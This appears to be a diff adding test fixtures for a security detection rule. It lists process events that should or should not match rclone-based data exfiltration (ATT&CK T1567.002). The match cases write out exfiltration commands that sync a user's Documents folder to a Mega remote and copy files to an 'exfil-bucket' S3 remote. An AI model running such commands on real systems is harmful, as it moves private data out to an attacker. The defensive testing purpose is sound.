@@ -1,0 +1,17 @@
+match:
+  - desc: "rclone copy to an S3 remote (ART T1567.002)"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5301, "ppid": 4000, "exe": "/opt/homebrew/bin/rclone", "name": "rclone", "args": ["rclone", "copy", "/tmp/T1567002", "s3remote:exfil-bucket"], "uid": 501, "euid": 501, "is_platform": false, "is_signed": true, "parent": {"pid": 4000, "exe": "/usr/local/microsoft/powershell/7/pwsh", "name": "pwsh", "is_platform": true, "is_signed": true}}}
+  - desc: "rclone.exe sync to Mega on Windows"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6301, "ppid": 4000, "exe": "C:\\Users\\alice\\AppData\\Local\\Temp\\rclone.exe", "name": "rclone.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "rclone.exe sync C:\\Users\\alice\\Documents mega:dump --config C:\\Users\\alice\\AppData\\Local\\Temp\\rc.conf", "args": ["rclone.exe", "sync", "C:\\Users\\alice\\Documents", "mega:dump", "--config", "C:\\Users\\alice\\AppData\\Local\\Temp\\rc.conf"], "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+nomatch:
+  - desc: "benign lookalike - rclone lists its remotes"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5311, "ppid": 4000, "exe": "/opt/homebrew/bin/rclone", "name": "rclone", "args": ["rclone", "listremotes"], "uid": 501, "euid": 501, "is_platform": false, "is_signed": true, "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh", "is_platform": true, "is_signed": true}}}
+  - desc: "rclone config edit"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24311, "ppid": 24000, "exe": "/usr/bin/rclone", "name": "rclone", "uid": -1, "euid": -1, "username": "alice", "cmdline": "rclone config", "args": ["rclone", "config"], "parent": {"pid": 24000, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "cp copies a folder named copy"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5312, "ppid": 4000, "exe": "/bin/cp", "name": "cp", "args": ["cp", "-r", "/Users/rifqi/copy", "/tmp/x"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.cp", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh", "is_platform": true, "is_signed": true}}}
